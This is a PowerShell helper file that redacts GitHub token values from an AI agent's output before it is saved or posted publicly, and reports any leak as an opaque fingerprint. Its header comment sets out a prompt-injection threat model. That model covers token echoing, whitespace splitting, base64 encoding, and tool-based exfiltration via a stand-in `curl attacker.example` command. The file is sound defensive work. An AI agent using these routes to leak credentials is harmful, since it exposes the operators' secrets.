<#
    .SYNOPSIS
        Shared token-leak scrubbing helpers used by analyze.ps1 (write-time)
        and post-analyses.ps1 (egress to public GitHub issue).

    .DESCRIPTION
        This file is NOT a standalone script. It's dot-sourced by sibling
        scripts that need to redact env-token values from text before
        writing it to disk or POSTing it to a public surface.

        The scrubbing here is a LAST-LINE defense against prompt-injection-
        induced secret exfiltration. The real defenses are:
          (a) running the agent without a write-scoped GH_TOKEN at all
              (see fetch.yml -- the analyze step deliberately does not
              receive $(GH_PAT)), and
          (b) sanitize.ps1 dropping any work item that contains secret
              patterns BEFORE its content ever reaches the agent.

        What this helper catches: a model verbatim-echoing an env value
        it had read access to, optionally with simple whitespace injection
        (`abcd efgh` instead of `abcdefgh`).

        What this helper does NOT catch: base64-encoded leaks, ROT13-style
        encodings, or any tool-based exfiltration (a `curl attacker.example`
        spawned by the agent will leave no trace in the output we scrub).
        Defenders should not rely on this layer alone.
#>

Set-StrictMode -Version Latest

function Get-LeakageTokens {
    # Returns the env-var values worth scrubbing for, sorted longest-first
    # so a longer token is fully redacted before a shorter substring
    # iteration would mutate it mid-text.
    #
    # 30-char floor:
    #   - real fine-grained PAT is >= 80 chars
    #   - unresolved AzDO macros are ~14 chars
    #   - 30 catches realistic tokens without false-positiving on every
    #     short config string the model might echo.
    #
    # Unary comma preserves [string[]] shape across the return pipeline
    # (StrictMode-safe for 0/1 element cases).
    return ,@(
        @($env:COPILOT_GITHUB_TOKEN, $env:GH_TOKEN, $env:GITHUB_TOKEN) |
            Where-Object { -not [string]::IsNullOrEmpty($_) -and $_.Length -ge 30 } |
            Sort-Object Length -Descending
    )
}

function Find-LeakedTokenFingerprints {
    # Scans $Text for the literal value of any token in $Tokens. Returns
    # opaque fingerprints for matches; NEVER returns the secret itself
    # or any reconstructible substring.
    #
    # Fingerprint format: `<token leak: bucket=Nx>` where N is the
    # length rounded DOWN to the nearest 10 (or "100+" for >=100). No
    # first character, no exact length -- enough information for an
    # operator to tell "a PAT-shaped leak fired" apart from "a short
    # token-shaped leak fired" without disclosing identifying details.
    #
    # Matches both the verbatim text and a whitespace-collapsed copy of
    # the text, defending against the trivial `abcd efgh` style injection
    # where a model splits the token with a space. Does NOT defend against
    # base64 / encoding-based bypasses -- see the file header.
    param(
        [Parameter(Mandatory)] [AllowEmptyString()] [string] $Text,
        [Parameter()]          [string[]] $Tokens = @()
    )
    if ([string]::IsNullOrEmpty($Text) -or -not $Tokens) {
        return ,([string[]] @())
    }
    $textNorm = [regex]::Replace($Text, '\s+', '')
    $found = New-Object System.Collections.Generic.List[string]
    foreach ($t in $Tokens) {
        if ([string]::IsNullOrEmpty($t)) { continue }
        if ($t.Length -lt 30) { continue }
        $tokenNorm = [regex]::Replace($t, '\s+', '')
        $hit = $Text.Contains($t) -or ($tokenNorm.Length -ge 30 -and $textNorm.Contains($tokenNorm))
        if ($hit) {
            $bucket = if ($t.Length -ge 100) { '100+' } else { (([math]::Floor($t.Length / 10) * 10).ToString() + 'x') }
            $found.Add(("<token leak: bucket={0}>" -f $bucket)) | Out-Null
        }
    }
    return ,$found.ToArray()
}

function Remove-LeakedTokens {
    # Pure function: returns @{ Text = <scrubbed>; Fingerprints = <array> }.
    # Caller decides whether to log a warning, fail the run, etc.
    #
    # NOTE: the .Replace() pass redacts only the verbatim token (no
    # whitespace-fuzzing). Reconstructing a whitespace-mangled token
    # well enough to redact it would require heuristic edits that risk
    # corrupting legitimate text -- the goal of the .Replace() is to
    # remove the leak when found verbatim; the Fingerprints array tells
    # the caller "a leak was DETECTED" even when the literal substring
    # is split.
    param(
        [Parameter(Mandatory)] [AllowEmptyString()] [string] $Text,
        [Parameter()]          [string[]] $Tokens = @()
    )
    $fingerprints = Find-LeakedTokenFingerprints -Text $Text -Tokens $Tokens
    $out = $Text
    if ($fingerprints.Count -gt 0 -and $Tokens) {
        foreach ($tok in $Tokens) {
            if ([string]::IsNullOrEmpty($tok)) { continue }
            if ($tok.Length -lt 30)            { continue }
            $out = $out.Replace($tok, '<redacted-leaked-secret>')
        }
    }
    return @{ Text = $out; Fingerprints = $fingerprints }
}
